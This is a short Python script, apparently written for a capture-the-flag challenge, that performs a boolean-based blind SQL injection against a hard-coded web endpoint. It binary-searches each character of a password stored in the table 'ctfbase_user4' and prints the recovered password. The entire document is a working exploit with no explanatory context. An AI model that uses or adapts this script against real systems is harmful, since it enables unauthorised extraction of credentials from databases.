import requests

url = "http://8.134.167.231:49183/api/v4.php?id=1' and "

result = ""
i = 0

while True:
    i = i+1
    head = 32
    tail = 127
    while head < tail:
        mid = (head + tail) >> 1
        payload = f"1=if((ascii( substr((select password from ctfbase_user4 limit 24,1),{i},1))>{mid}),1,0)--+"
        r = requests.get(url+payload)
        if 'admin' in r.text:
            head = mid + 1
        else:
            tail = mid

    if head != 32:
        result += chr(head)
    else:
        break
    print(result)

